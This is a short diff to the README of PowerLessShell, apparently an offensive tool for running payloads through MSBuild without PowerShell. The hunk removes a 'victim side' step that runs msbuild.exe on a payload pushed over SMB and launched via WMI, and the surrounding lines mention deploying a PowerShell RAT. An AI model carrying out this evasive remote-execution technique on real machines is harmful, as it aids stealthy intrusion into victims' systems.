@@ -37,11 +37,6 @@ PowerLessShell - Remain Stealth
 [+] Run the command inside of payload.csproj.cmd on the target system using WMI.
 ```
 
-Victim side (Push the file using SMB. Execute the following command using WMI)
-```
-cmd.exe /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload
-```
-
 # Example
 
 The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-PowerShell-RAT without running a single instance of PowerShell
